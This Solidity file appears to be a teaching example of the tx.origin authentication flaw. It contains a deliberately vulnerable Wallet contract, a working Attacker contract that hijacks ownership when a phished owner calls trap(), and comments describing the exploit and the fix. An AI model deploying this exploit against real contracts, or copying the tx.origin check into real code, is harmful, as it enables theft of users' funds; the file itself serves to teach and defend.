// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// VULNERABILITY: tx.origin Authentication (Phishing via Delegated Call)
//
// WHAT IT IS:
//   tx.origin is the address that *originally* signed and submitted the
//   transaction — always the EOA (externally-owned account) at the very start
//   of the call chain. msg.sender, by contrast, is the *immediate* caller,
//   which can be a contract. Using tx.origin for authorization means ANY
//   contract that can get the real owner to interact with it can impersonate
//   the owner.
//
// HOW IT IS EXPLOITED:
//   1. The attacker deploys the Attacker contract below, hard-coding
//      the Wallet address and the attacker's own address.
//   2. The attacker tricks the legitimate owner into calling
//      Attacker.trap() e.g., via a phishing site, a fake airdrop claim,
//      a malicious NFT contract, or any other social-engineering vector.
//   3. When the owner's EOA signs the transaction, tx.origin is set to
//      the owner's address for the entire call chain.
//   4. Attacker.trap() immediately calls Wallet.transferOwnership(attacker).
//      Inside transferOwnership, tx.origin == owner.address → check passes.
//   5. Ownership is silently transferred. The attacker now controls the wallet.
//
// THE FIX:
//   Replace tx.origin with msg.sender everywhere authorization is required.
//   msg.sender is always the direct caller; a malicious intermediary contract
//   cannot forge it. tx.origin has very few legitimate use cases (e.g.,
//   blocking contract-to-contract calls entirely) and should almost never
//   be used for access control.
// =============================================================================

contract Wallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // VULNERABLE: tx.origin can be the owner even when msg.sender is an
    // attacker-controlled contract.
    function transferOwnership(address newOwner) external {
        require(tx.origin == owner, "Not owner"); // !! should be msg.sender !!
        owner = newOwner;
    }

    function deposit() external payable {}

    function withdraw(uint256 amount) external {
        require(tx.origin == owner, "Not owner"); // !! same flaw !!
        payable(owner).transfer(amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}


// ATTACKER CONTRACT — demonstrates the phishing exploit
contract Attacker {
    Wallet public wallet;
    address public attacker;

    constructor(address _wallet) {
        wallet = Wallet(_wallet);
        attacker = msg.sender;
    }

    // The owner is lured into calling this function (e.g., "claim your tokens!").
    // As long as the owner's EOA initiates the transaction, tx.origin inside
    // Wallet.transferOwnership will equal the owner and the check will pass.
    function trap() external {
        wallet.transferOwnership(attacker);
    }
}
